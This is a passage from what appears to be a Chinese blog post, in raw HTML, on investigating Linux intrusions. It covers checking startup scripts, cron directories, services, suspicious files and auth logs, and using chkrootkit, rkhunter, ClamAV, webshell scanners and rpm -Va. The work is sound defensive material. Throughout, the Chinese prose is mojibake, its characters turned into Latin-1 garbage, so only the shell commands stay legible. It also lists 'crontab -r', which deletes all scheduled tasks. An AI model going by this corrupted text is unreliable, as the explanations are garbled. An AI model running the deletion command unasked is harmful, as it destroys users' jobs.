&#x2F;etc&#x2F;rc.d&#x2F;rc3.d&#x2F;S100ssh</span><br></pre></td></tr></table></figure><p>æ­¤å¤„sshdæ˜¯å…·ä½“æœåŠ¡çš„è„šæœ¬æ–‡ä»¶ï¼ŒS100sshæ˜¯å…¶è½¯é“¾æ¥ï¼ŒSå¼€å¤´ä»£è¡¨åŠ è½½æ—¶è‡ªå¯åŠ¨ï¼›å¦‚æœæ˜¯Kå¼€å¤´çš„è„šæœ¬æ–‡ä»¶ï¼Œä»£è¡¨è¿è¡Œçº§åˆ«åŠ è½½æ—¶éœ€è¦å…³é—­çš„ã€‚</p><p><strong>å…¥ä¾µæ’æŸ¥ï¼š</strong></p><p>å¯åŠ¨é¡¹æ–‡ä»¶ï¼š more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l /etc/rc.d/rc3.d/</p><h4 id="1-6-æ£€æŸ¥å®šæ—¶ä»»åŠ¡"><a href="#1-6-æ£€æŸ¥å®šæ—¶ä»»åŠ¡" class="headerlink" title="1.6 æ£€æŸ¥å®šæ—¶ä»»åŠ¡"></a>1.6 æ£€æŸ¥å®šæ—¶ä»»åŠ¡</h4><p><strong>åŸºæœ¬ä½¿ç”¨</strong></p><p>1ã€åˆ©ç”¨crontabåˆ›å»ºè®¡åˆ’ä»»åŠ¡</p><ul><li>åŸºæœ¬å‘½ä»¤</li></ul><p>crontab -l åˆ—å‡ºæŸä¸ªç”¨æˆ·cronæœåŠ¡çš„è¯¦ç»†å†…å®¹</p><p>Tipsï¼šé»˜è®¤ç¼–å†™çš„crontabæ–‡ä»¶ä¼šä¿å­˜åœ¨ (/var/spool/cron/ç”¨æˆ·å ä¾‹å¦‚: /var/spool/cron/root</p><p>crontab -r åˆ é™¤æ¯ä¸ªç”¨æˆ·crontä»»åŠ¡(è°¨æ…ï¼šåˆ é™¤æ‰€æœ‰çš„è®¡åˆ’ä»»åŠ¡)</p><p>crontab -e ä½¿ç”¨ç¼–è¾‘å™¨ç¼–è¾‘å½“å‰çš„crontabæ–‡ä»¶</p><p>å¦‚ï¼š*/1* * echo â€œhello worldâ€ &gt;&gt; /tmp/test.txt æ¯åˆ†é’Ÿå†™å…¥æ–‡ä»¶</p><p>2ã€åˆ©ç”¨anacronå®ç°å¼‚æ­¥å®šæ—¶ä»»åŠ¡è°ƒåº¦</p><ul><li>ä½¿ç”¨æ¡ˆä¾‹</li></ul><p>æ¯å¤©è¿è¡Œ /home/backup.shè„šæœ¬ï¼š vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh</p><p>å½“æœºå™¨åœ¨ backup.sh æœŸæœ›è¢«è¿è¡Œæ—¶æ˜¯å…³æœºçš„ï¼Œanacronä¼šåœ¨æœºå™¨å¼€æœºååˆ†é’Ÿä¹‹åè¿è¡Œå®ƒï¼Œè€Œä¸ç”¨å†ç­‰å¾… 7å¤©ã€‚</p><p><strong>å…¥ä¾µæ’æŸ¥</strong></p><p>é‡ç‚¹å…³æ³¨ä»¥ä¸‹ç›®å½•ä¸­æ˜¯å¦å­˜åœ¨æ¶æ„è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;* </span><br><span class="line">&#x2F;etc&#x2F;crontab</span><br><span class="line">&#x2F;etc&#x2F;cron.d&#x2F;*</span><br><span class="line">&#x2F;etc&#x2F;cron.daily&#x2F;* </span><br><span class="line">&#x2F;etc&#x2F;cron.hourly&#x2F;* </span><br><span class="line">&#x2F;etc&#x2F;cron.monthly&#x2F;*</span><br><span class="line">&#x2F;etc&#x2F;cron.weekly&#x2F;</span><br><span class="line">&#x2F;etc&#x2F;anacrontab</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;anacron&#x2F;*</span><br></pre></td></tr></table></figure><p>å°æŠ€å·§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more &#x2F;etc&#x2F;cron.daily&#x2F;*  æŸ¥çœ‹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶</span><br></pre></td></tr></table></figure><h4 id="1-7-æ£€æŸ¥æœåŠ¡"><a href="#1-7-æ£€æŸ¥æœåŠ¡" class="headerlink" title="1.7 æ£€æŸ¥æœåŠ¡"></a>1.7 æ£€æŸ¥æœåŠ¡</h4><p><strong>æœåŠ¡è‡ªå¯åŠ¨</strong></p><p>ç¬¬ä¸€ç§ä¿®æ”¹æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chkconfig [--level è¿è¡Œçº§åˆ«] [ç‹¬ç«‹æœåŠ¡å] [on|off]</span><br><span class="line">chkconfig â€“level  2345 httpd on  å¼€å¯è‡ªå¯åŠ¨</span><br><span class="line">chkconfig httpd on ï¼ˆé»˜è®¤levelæ˜¯2345ï¼‰</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§ä¿®æ”¹æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä¿®æ”¹&#x2F;etc&#x2F;re.d&#x2F;rc.local æ–‡ä»¶  </span><br><span class="line">åŠ å…¥ &#x2F;etc&#x2F;init.d&#x2F;httpd start</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰ç§ä¿®æ”¹æ–¹æ³•ï¼š</p><p>ä½¿ç”¨ntsysvå‘½ä»¤ç®¡ç†è‡ªå¯åŠ¨ï¼Œå¯ä»¥ç®¡ç†ç‹¬ç«‹æœåŠ¡å’ŒxinetdæœåŠ¡ã€‚</p><p><strong>å…¥ä¾µæ’æŸ¥</strong></p><p>1ã€æŸ¥è¯¢å·²å®‰è£…çš„æœåŠ¡ï¼š</p><p>RPMåŒ…å®‰è£…çš„æœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chkconfig  --list  æŸ¥çœ‹æœåŠ¡è‡ªå¯åŠ¨çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„RPMåŒ…å®‰è£…çš„æœåŠ¡</span><br><span class="line">ps aux | grep crond æŸ¥çœ‹å½“å‰æœåŠ¡</span><br><span class="line"></span><br><span class="line">ç³»ç»Ÿåœ¨3ä¸5çº§åˆ«ä¸‹çš„å¯åŠ¨é¡¹ </span><br><span class="line">ä¸­æ–‡ç¯å¢ƒ</span><br><span class="line">chkconfig --list | grep &quot;3:å¯ç”¨\|5:å¯ç”¨&quot;</span><br><span class="line">è‹±æ–‡ç¯å¢ƒ</span><br><span class="line">chkconfig --list | grep &quot;3:on\|5:on&quot;</span><br></pre></td></tr></table></figure><p>æºç åŒ…å®‰è£…çš„æœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹æœåŠ¡å®‰è£…ä½ç½® ï¼Œä¸€èˆ¬æ˜¯åœ¨&#x2F;user&#x2F;local&#x2F;</span><br><span class="line">service httpd start</span><br><span class="line">æœç´¢&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;  æŸ¥çœ‹æ˜¯å¦å­˜åœ¨</span><br></pre></td></tr></table></figure><h4 id="1-8-æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶"><a href="#1-8-æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶" class="headerlink" title="1.8 æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶"></a>1.8 æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶</h4><p>1ã€æŸ¥çœ‹æ•æ„Ÿç›®å½•ï¼Œå¦‚/tmpç›®å½•ä¸‹çš„æ–‡ä»¶ï¼ŒåŒæ—¶æ³¨æ„éšè—æ–‡ä»¶å¤¹ï¼Œä»¥â€œ..â€ä¸ºåçš„æ–‡ä»¶å¤¹å…·æœ‰éšè—å±æ€§</p><p>2ã€å¾—åˆ°å‘ç°WEBSHELLã€è¿œæ§æœ¨é©¬çš„åˆ›å»ºæ—¶é—´ï¼Œå¦‚ä½•æ‰¾å‡ºåŒä¸€æ—¶é—´èŒƒå›´å†…åˆ›å»ºçš„æ–‡ä»¶ï¼Ÿ</p><p> å¯ä»¥ä½¿ç”¨findå‘½ä»¤æ¥æŸ¥æ‰¾ï¼Œå¦‚ find /opt -iname â€œ*â€ -atime 1 -type f æ‰¾å‡º /opt ä¸‹ä¸€å¤©å‰è®¿é—®è¿‡çš„æ–‡ä»¶</p><p>3ã€é’ˆå¯¹å¯ç–‘æ–‡ä»¶å¯ä»¥ä½¿ç”¨statè¿›è¡Œåˆ›å»ºä¿®æ”¹æ—¶é—´ã€‚</p><h4 id="1-9-æ£€æŸ¥ç³»ç»Ÿæ—¥å¿—"><a href="#1-9-æ£€æŸ¥ç³»ç»Ÿæ—¥å¿—" class="headerlink" title="1.9 æ£€æŸ¥ç³»ç»Ÿæ—¥å¿—"></a>1.9 æ£€æŸ¥ç³»ç»Ÿæ—¥å¿—</h4><p>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/</p><p>æŸ¥çœ‹æ—¥å¿—é…ç½®æƒ…å†µï¼šmore /etc/rsyslog.conf</p><table><thead><tr><th align="center">æ—¥å¿—æ–‡ä»¶</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">è®°å½•äº†ç³»ç»Ÿå®šæ—¶ä»»åŠ¡ç›¸å…³çš„æ—¥å¿—</td></tr><tr><td align="center">/var/log/cups</td><td align="center">è®°å½•æ‰“å°ä¿¡æ¯çš„æ—¥å¿—</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">è®°å½•äº†ç³»ç»Ÿåœ¨å¼€æœºæ—¶å†…æ ¸è‡ªæ£€çš„ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨dmesgå‘½ä»¤ç›´æ¥æŸ¥çœ‹å†…æ ¸è‡ªæ£€ä¿¡æ¯</td></tr><tr><td align="center">/var/log/mailog</td><td align="center">è®°å½•é‚®ä»¶ä¿¡æ¯</td></tr><tr><td align="center">/var/log/message</td><td align="center">è®°å½•ç³»ç»Ÿé‡è¦ä¿¡æ¯çš„æ—¥å¿—ã€‚è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ä¼šè®°å½•Linuxç³»ç»Ÿçš„ç»å¤§å¤šæ•°é‡è¦ä¿¡æ¯ï¼Œå¦‚æœç³»ç»Ÿå‡ºç°é—®é¢˜æ—¶ï¼Œé¦–å…ˆè¦æ£€æŸ¥çš„å°±åº”è¯¥æ˜¯è¿™ä¸ªæ—¥å¿—æ–‡ä»¶</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">è®°å½•é”™è¯¯ç™»å½•æ—¥å¿—ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viæŸ¥çœ‹ï¼Œè€Œè¦ä½¿ç”¨lastbå‘½ä»¤æŸ¥çœ‹</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">è®°å½•ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´çš„æ—¥å¿—ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viï¼Œè€Œè¦ä½¿ç”¨lastlogå‘½ä»¤æŸ¥çœ‹</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">æ°¸ä¹…è®°å½•æ‰€æœ‰ç”¨æˆ·çš„ç™»å½•ã€æ³¨é”€ä¿¡æ¯ï¼ŒåŒæ—¶è®°å½•ç³»ç»Ÿçš„å¯åŠ¨ã€é‡å¯ã€å…³æœºäº‹ä»¶ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viï¼Œè€Œéœ€è¦ä½¿ç”¨lastå‘½ä»¤æ¥æŸ¥çœ‹</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">è®°å½•å½“å‰å·²ç»ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šéšç€ç”¨æˆ·çš„ç™»å½•å’Œæ³¨é”€ä¸æ–­å˜åŒ–ï¼Œåªè®°å½•å½“å‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ç›´æ¥viï¼Œè€Œè¦ä½¿ç”¨w,who,usersç­‰å‘½ä»¤æ¥æŸ¥è¯¢</td></tr><tr><td align="center">/var/log/secure</td><td align="center">è®°å½•éªŒè¯å’Œæˆæƒæ–¹é¢çš„ä¿¡æ¯ï¼Œåªè¦æ¶‰åŠè´¦å·å’Œå¯†ç çš„ç¨‹åºéƒ½ä¼šè®°å½•ï¼Œæ¯”å¦‚SSHç™»å½•ï¼Œsuåˆ‡æ¢ç”¨æˆ·ï¼Œsudoæˆæƒï¼Œç”šè‡³æ·»åŠ ç”¨æˆ·å’Œä¿®æ”¹ç”¨æˆ·å¯†ç éƒ½ä¼šè®°å½•åœ¨è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­</td></tr></tbody></table><p>æ—¥å¿—åˆ†ææŠ€å·§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1ã€å®šä½æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºçš„rootå¸å·ï¼š    </span><br><span class="line">grep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">å®šä½æœ‰å“ªäº›IPåœ¨çˆ†ç ´ï¼š</span><br><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿ</span><br><span class="line"> grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e &#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">2ã€ç™»å½•æˆåŠŸçš„IPæœ‰å“ªäº›ï¼š     </span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">ç™»å½•æˆåŠŸçš„æ—¥æœŸã€ç”¨æˆ·åã€IPï¼š</span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39; </span><br><span class="line"></span><br><span class="line">3ã€å¢åŠ ä¸€ä¸ªç”¨æˆ·kaliæ—¥å¿—ï¼š</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name&#x3D;kali, GID&#x3D;1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name&#x3D;kali, UID&#x3D;1001, GID&#x3D;1001, home&#x3D;&#x2F;home&#x2F;kali</span><br><span class="line">, shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; &#x2F;var&#x2F;log&#x2F;secure </span><br><span class="line"></span><br><span class="line">4ã€åˆ é™¤ç”¨æˆ·kaliæ—¥å¿—ï¼š</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line"># grep &quot;userdel&quot; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br><span class="line">5ã€suåˆ‡æ¢ç”¨æˆ·ï¼š</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid&#x3D;0)</span><br><span class="line"></span><br><span class="line">sudoæˆæƒæ‰§è¡Œ:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY&#x3D;pts&#x2F;4 ; PWD&#x3D;&#x2F;home&#x2F;good ; USER&#x3D;root ; COMMAND&#x3D;&#x2F;sbin&#x2F;shutdown -r now</span><br></pre></td></tr></table></figure><h3 id="0x02-å·¥å…·ç¯‡"><a href="#0x02-å·¥å…·ç¯‡" class="headerlink" title="0x02 å·¥å…·ç¯‡"></a>0x02 å·¥å…·ç¯‡</h3><h4 id="2-1-RootkitæŸ¥æ€"><a href="#2-1-RootkitæŸ¥æ€" class="headerlink" title="2.1 RootkitæŸ¥æ€"></a>2.1 RootkitæŸ¥æ€</h4><ul><li><p>chkrootkit</p><p>ç½‘å€ï¼š<a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨æ–¹æ³•ï¼š</span><br><span class="line">wget ftp:&#x2F;&#x2F;ftp.pangeia.com.br&#x2F;pub&#x2F;seg&#x2F;pac&#x2F;chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense</span><br><span class="line">#ç¼–è¯‘å®Œæˆæ²¡æœ‰æŠ¥é”™çš„è¯æ‰§è¡Œæ£€æŸ¥</span><br><span class="line">.&#x2F;chkrootkit</span><br></pre></td></tr></table></figure></li><li><p>rkhunter</p><p>ç½‘å€ï¼š<a href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨æ–¹æ³•ï¼š</span><br><span class="line">Wget https:&#x2F;&#x2F;nchc.dl.sourceforge.net&#x2F;project&#x2F;rkhunter&#x2F;rkhunter&#x2F;1.4.4&#x2F;rkhunter-1.4.4.tar.gz</span><br><span class="line">tar -zxvf rkhunter-1.4.4.tar.gz</span><br><span class="line">cd rkhunter-1.4.4</span><br><span class="line">.&#x2F;installer.sh --install</span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-2-ç—…æ¯’æŸ¥æ€"><a href="#2-2-ç—…æ¯’æŸ¥æ€" class="headerlink" title="2.2 ç—…æ¯’æŸ¥æ€"></a>2.2 ç—…æ¯’æŸ¥æ€</h4><ul><li><p>Clamav</p><p>ClamAVçš„å®˜æ–¹ä¸‹è½½åœ°å€ä¸ºï¼š<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a></p><p>å®‰è£…æ–¹å¼ä¸€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1ã€å®‰è£…zlibï¼š</span><br><span class="line">wget http:&#x2F;&#x2F;nchc.dl.sourceforge.net&#x2F;project&#x2F;libpng&#x2F;zlib&#x2F;1.2.7&#x2F;zlib-1.2.7.tar.gz </span><br><span class="line">tar -zxvf  zlib-1.2.7.tar.gz</span><br><span class="line">cd zlib-1.2.7</span><br><span class="line">#å®‰è£…ä¸€ä¸‹gccç¼–è¯‘ç¯å¢ƒï¼š yum install gcc</span><br><span class="line">CFLAGS&#x3D;&quot;-O3 -fPIC&quot; .&#x2F;configure --prefix&#x3D; &#x2F;usr&#x2F;local&#x2F;zlib&#x2F;</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">2ã€æ·»åŠ ç”¨æˆ·ç»„clamavå’Œç»„æˆå‘˜clamavï¼š</span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s &#x2F;bin&#x2F;false -c &quot;Clam AntiVirus&quot; clamav</span><br><span class="line"></span><br><span class="line">3ã€å®‰è£…Clamav</span><br><span class="line">tar â€“zxvf clamav-0.97.6.tar.gz</span><br><span class="line">cd clamav-0.97.6</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;opt&#x2F;clamav --disable-clamav -with-zlib&#x3D;&#x2F;usr&#x2F;local&#x2F;zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">4ã€é…ç½®Clamav</span><br><span class="line">mkdir &#x2F;opt&#x2F;clamav&#x2F;logs</span><br><span class="line">mkdir &#x2F;opt&#x2F;clamav&#x2F;updata</span><br><span class="line">touch &#x2F;opt&#x2F;clamav&#x2F;logs&#x2F;freshclam.log</span><br><span class="line">touch &#x2F;opt&#x2F;clamav&#x2F;logs&#x2F;clamd.log</span><br><span class="line">cd &#x2F;opt&#x2F;clamav&#x2F;logs</span><br><span class="line">chown clamav:clamav clamd.log</span><br><span class="line">chown clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line">5ã€ClamAV ä½¿ç”¨ï¼š</span><br><span class="line"> &#x2F;opt&#x2F;clamav&#x2F;bin&#x2F;freshclam å‡çº§ç—…æ¯’åº“</span><br><span class="line">.&#x2F;clamscan â€“h æŸ¥çœ‹ç›¸åº”çš„å¸®åŠ©ä¿¡æ¯</span><br><span class="line">.&#x2F;clamscan -r &#x2F;home  æ‰«ææ‰€æœ‰ç”¨æˆ·çš„ä¸»ç›®å½•å°±ä½¿ç”¨</span><br><span class="line">.&#x2F;clamscan -r --bell -i &#x2F;bin  æ‰«æbinç›®å½•å¹¶ä¸”æ˜¾ç¤ºæœ‰é—®é¢˜çš„æ–‡ä»¶çš„æ‰«æç»“æœ</span><br></pre></td></tr></table></figure><p>å®‰è£…æ–¹å¼äºŒï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#å®‰è£…</span><br><span class="line">yum install -y clamav</span><br><span class="line">#æ›´æ–°ç—…æ¯’åº“</span><br><span class="line">freshclam</span><br><span class="line">#æ‰«ææ–¹æ³•</span><br><span class="line">clamscan -r &#x2F;etc --max-dir-recursion&#x3D;5 -l &#x2F;root&#x2F;etcclamav.log</span><br><span class="line">clamscan -r &#x2F;bin --max-dir-recursion&#x3D;5 -l &#x2F;root&#x2F;binclamav.log</span><br><span class="line">clamscan -r &#x2F;usr --max-dir-recursion&#x3D;5 -l &#x2F;root&#x2F;usrclamav.log</span><br><span class="line">#æ‰«æå¹¶æ€æ¯’</span><br><span class="line">clamscan -r  --remove  &#x2F;usr&#x2F;bin&#x2F;bsd-port</span><br><span class="line">clamscan -r  --remove  &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">clamscan -r --remove  &#x2F;usr&#x2F;local&#x2F;zabbix&#x2F;sbin</span><br><span class="line">#æŸ¥çœ‹æ—¥å¿—å‘ç°</span><br><span class="line">cat &#x2F;root&#x2F;usrclamav.log |grep FOUND</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-3-webshellæŸ¥æ€"><a href="#2-3-webshellæŸ¥æ€" class="headerlink" title="2.3 webshellæŸ¥æ€"></a>2.3 webshellæŸ¥æ€</h4><p>linuxç‰ˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ²³é©¬webshellæŸ¥æ€ï¼šhttp:&#x2F;&#x2F;www.shellpub.com</span><br><span class="line">æ·±ä¿¡æœWebshellç½‘ç«™åé—¨æ£€æµ‹å·¥å…·ï¼šhttp:&#x2F;&#x2F;edr.sangfor.com.cn&#x2F;backdoor_detection.html</span><br></pre></td></tr></table></figure><h4 id="2-4-RPM-checkæ£€æŸ¥"><a href="#2-4-RPM-checkæ£€æŸ¥" class="headerlink" title="2.4 RPM checkæ£€æŸ¥"></a>2.4 RPM checkæ£€æŸ¥</h4><p> ç³»ç»Ÿå®Œæ•´æ€§å¯ä»¥é€šè¿‡rpmè‡ªå¸¦çš„-Vaæ¥æ ¡éªŒæ£€æŸ¥æ‰€æœ‰çš„rpmè½¯ä»¶åŒ…ï¼ŒæŸ¥çœ‹å“ªäº›å‘½ä»¤æ˜¯å¦è¢«æ›¿æ¢äº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;rpm -Va &gt; rpm.log</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸€åˆ‡å‡æ ¡éªŒæ­£å¸¸å°†ä¸ä¼šäº§ç”Ÿä»»ä½•è¾“å‡ºï¼Œå¦‚æœæœ‰ä¸ä¸€è‡´çš„åœ°æ–¹ï¼Œå°±ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œè¾“å‡ºæ ¼å¼æ˜¯8ä½é•¿å­—ç¬¦ä¸²ï¼Œæ¯ä¸ªå­—ç¬¦éƒ½ç”¨ä»¥è¡¨ç¤ºæ–‡ä»¶ä¸RPMæ•°æ®åº“ä¸­ä¸€ç§å±æ€§çš„æ¯”è¾ƒç»“æœ ï¼Œå¦‚æœæ˜¯. (ç‚¹) åˆ™è¡¨ç¤ºæµ‹è¯•é€šè¿‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">éªŒè¯å†…å®¹ä¸­çš„8ä¸ªä¿¡æ¯çš„å…·ä½“å†…å®¹å¦‚ä¸‹ï¼š</span><br><span class="line">        S         æ–‡ä»¶å¤§å°æ˜¯å¦æ”¹å˜</span><br><span class="line">        M         æ–‡ä»¶çš„ç±»å‹æˆ–æ–‡ä»¶çš„æƒé™ï¼ˆrwxï¼‰æ˜¯å¦è¢«æ”¹å˜</span><br><span class="line">        5         æ–‡ä»¶MD5æ ¡éªŒæ˜¯å¦æ”¹å˜ï¼ˆå¯ä»¥çœ‹æˆæ–‡ä»¶å†…å®¹æ˜¯å¦æ”¹å˜ï¼‰</span><br><span class="line">        D         è®¾å¤‡ä¸­ï¼Œä»ä»£ç æ˜¯å¦æ”¹å˜</span><br><span class="line">        L         